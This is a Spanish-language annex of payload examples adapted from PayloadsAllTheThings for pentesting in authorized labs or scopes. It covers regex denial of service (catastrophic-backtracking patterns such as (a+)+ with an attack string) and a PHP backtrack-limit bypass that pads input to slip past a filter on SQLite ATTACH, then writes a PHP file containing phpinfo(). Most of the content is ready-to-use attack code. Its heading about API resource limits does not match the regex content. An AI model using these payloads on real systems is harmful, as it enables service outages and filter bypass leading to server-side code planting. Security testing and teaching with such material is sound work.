# Límites insuficientes de recursos en API: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Regular Expression/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Regular%20Expression/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / Evil Regex

```ps1
aaaaaaaaaaaaaaaaaaaa! 
```

### Variantes presentes en tablas o texto del apartado

```text
(a+)+
([a-zA-Z]+)*
(a|aa)+
(a|a?)+
(.*a){x}
```

## 2. Metodología / Backtrack Limit

```php
$pattern = '/(a+)+$/';
$subject = str_repeat('a', 1000) . 'b';

if (preg_match($pattern, $subject)) {
    echo "Match found";
} else {
    echo "No match";
}
```

```php
$pattern = "~^(?:\\s|/\\*[\s\S]*?\\*/|(?:#|--)[^\n]*\n?|--\r?\n)*+ATTACH\\b~i";
if(preg_match($pattern, $query, $match)){
 die('error');
}
```

```php
<?php
$payload = <<<'SQL'
ATTACH DATABASE 'lol.php' AS lol;
CREATE TABLE lol.pwn (data text);
INSERT INTO lol.pwn (data) VALUES ('<?php phpinfo(); ?>');
SQL;

echo str_repeat("--\n", 350000) . $payload;
```

### Variantes presentes en tablas o texto del apartado

```text
PHP < 5.3.7
preg_match
0
false
preg_match()
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
